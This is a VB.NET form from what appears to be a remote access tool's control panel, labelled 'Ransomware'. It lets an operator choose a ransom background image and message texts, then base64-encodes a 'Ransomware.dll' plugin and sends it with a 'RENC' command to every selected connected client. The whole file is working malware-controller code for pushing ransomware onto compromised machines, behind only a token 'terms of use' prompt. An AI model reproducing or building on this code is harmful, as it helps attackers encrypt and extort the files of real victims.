Imports System.IO

Public Class Ransomware
    Dim path As String
    Private Sub Ransomware_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ToolStripStatusLabel1.Text = "Selected [" & AuthForm.Lv1.SelectedItems.Count & "]"
        Try
            path = "Tools\Background.png"
            Me.PictureBox1.Image = Image.FromFile(path)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click

    End Sub

    Private Sub PictureBox1_MouseClick(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseClick
        Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
        Dim openFileDialog2 As OpenFileDialog = openFileDialog
        openFileDialog2.Title = "Select Image"
        openFileDialog2.Filter = "(*.jpg;*.bmp;*.png)|*.jpg;*.bmp;*.png"
        Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
        If flag Then
            path = openFileDialog.FileName
            Me.PictureBox1.Image = Image.FromFile(path)
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        Dim result As Integer = MessageBox.Show("By using this feature you agree to the terms of use, do YOU want continue ?", Me.Text, MessageBoxButtons.YesNo)
        If result = DialogResult.Yes Then
            Try
                Dim B As Byte() = SB("RENC" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Ransomware.dll")) & Settings.SPL & Convert.ToBase64String(IO.File.ReadAllBytes(path)) & Settings.SPL & TextBox1.Text & Settings.SPL & TextBox2.Text & Settings.SPL & TextBox3.Text)
                For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
                MessageBox.Show("DONE!")
                Me.Close()
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2CircleButton1_Click(sender As Object, e As EventArgs)
        Me.Close()
    End Sub

    Private Sub Guna2CircleButton2_Click(sender As Object, e As EventArgs)
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub Guna2ControlBox1_Click(sender As Object, e As EventArgs) 
        Me.Close()
    End Sub

    Private Sub Guna2ControlBox2_Click(sender As Object, e As EventArgs) 
        Me.WindowState = FormWindowState.Minimized
    End Sub
End Class